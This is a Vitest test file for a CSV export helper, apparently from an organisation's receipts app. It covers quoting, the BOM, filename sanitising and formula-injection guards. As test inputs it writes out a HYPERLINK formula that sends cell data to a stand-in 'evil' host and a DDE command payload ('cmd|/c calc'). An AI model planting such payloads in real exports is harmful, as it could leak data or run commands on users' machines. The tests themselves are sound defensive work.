import { describe, it, expect } from "vitest";
import { deFormula, csvField, csvRow, toCsv, csvBody, exportFilename, csvHeaders } from "./csv";

describe("deFormula", () => {
  it("prefixes every character a spreadsheet treats as a formula start", () => {
    for (const c of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(deFormula(c + "SUM(A1)"), c).toBe("'" + c + "SUM(A1)");
    }
  });
  it("leaves ordinary values alone", () => {
    for (const s of ["Mary Penner", "1234", "", " leading space", "a=b", "Grade 3"]) {
      expect(deFormula(s), s).toBe(s);
    }
  });
});

describe("csvField", () => {
  it("renders null and undefined as empty", () => {
    expect(csvField(null)).toBe("");
    expect(csvField(undefined)).toBe("");
  });
  it("keeps zero and false — they are data, not absence", () => {
    expect(csvField(0)).toBe("0");
    expect(csvField(false)).toBe("false");
  });
  it("quotes on comma, quote, LF and CR", () => {
    expect(csvField("a,b")).toBe('"a,b"');
    expect(csvField('say "hi"')).toBe('"say ""hi"""');
    expect(csvField("line1\nline2")).toBe('"line1\nline2"');
    // An embedded CR is quoted but NOT formula-guarded: the guard only fires
    // on the first character, and a CR mid-value isn't a formula start.
    expect(csvField("line1\rline2")).toBe('"line1\rline2"');
  });
  it("doubles internal quotes", () => {
    // The photos manifest got this wrong: it wrapped in quotes without
    // doubling, so a family name containing " corrupted every later row.
    expect(csvField('O"Brien')).toBe('"O""Brien"');
  });
  it("applies BOTH the formula guard and quoting to an attack payload", () => {
    const attack = '=HYPERLINK("https://evil/?"&A1,"receipt")';
    const out = csvField(attack);
    expect(out.startsWith("\"'=")).toBe(true);      // guarded, then quoted
    expect(out).toContain('""');                    // internal quotes doubled
    // Opened in a spreadsheet this is inert text, not a live formula.
    expect(out).not.toMatch(/^=/);
  });
  it("neutralises a formula hidden in a family's own name", () => {
    expect(csvField("=cmd|'/c calc'!A1")).toMatch(/^"?'=/);
  });
});

describe("toCsv", () => {
  it("writes the header then each row", () => {
    expect(toCsv(["A", "B"], [[1, 2], [3, 4]])).toBe("A,B\n1,2\n3,4\n");
  });
  it("handles an empty row set", () => {
    expect(toCsv(["A"], [])).toBe("A\n");
  });
  it("escapes inside headers too", () => {
    expect(csvRow(["a,b"])).toBe('"a,b"\n');
  });
});

describe("csvBody", () => {
  it("prepends the UTF-8 BOM so Excel on Windows reads accents correctly", () => {
    const out = csvBody("Name\nPénner\n");
    expect(out.charCodeAt(0)).toBe(0xfeff);
    expect(out.slice(1)).toBe("Name\nPénner\n");
  });
});

describe("exportFilename", () => {
  it("prefixes the tenant slug", () => {
    expect(exportFilename("raising-arrows", "receipts")).toBe("raising-arrows-receipts.csv");
  });
  it("appends the year when given", () => {
    expect(exportFilename("ra", "receipts", 2026)).toBe("ra-receipts-2026.csv");
  });
  it("omits the year when null", () => {
    expect(exportFilename("ra", "recipients", null)).toBe("ra-recipients.csv");
  });
  it("strips characters that would break the Content-Disposition header", () => {
    // A slug containing a quote could otherwise terminate the filename="..."
    expect(exportFilename('ev"il; x', "receipts")).toBe("evilx-receipts.csv");
    expect(exportFilename("", "receipts")).toBe("export-receipts.csv");
  });
});

describe("csvHeaders", () => {
  it("marks the response as a no-store attachment", () => {
    const h = csvHeaders("ra-receipts.csv");
    expect(h["Content-Disposition"]).toBe('attachment; filename="ra-receipts.csv"');
    expect(h["Cache-Control"]).toBe("no-store");
    expect(h["Content-Type"]).toMatch(/text\/csv/);
  });
});
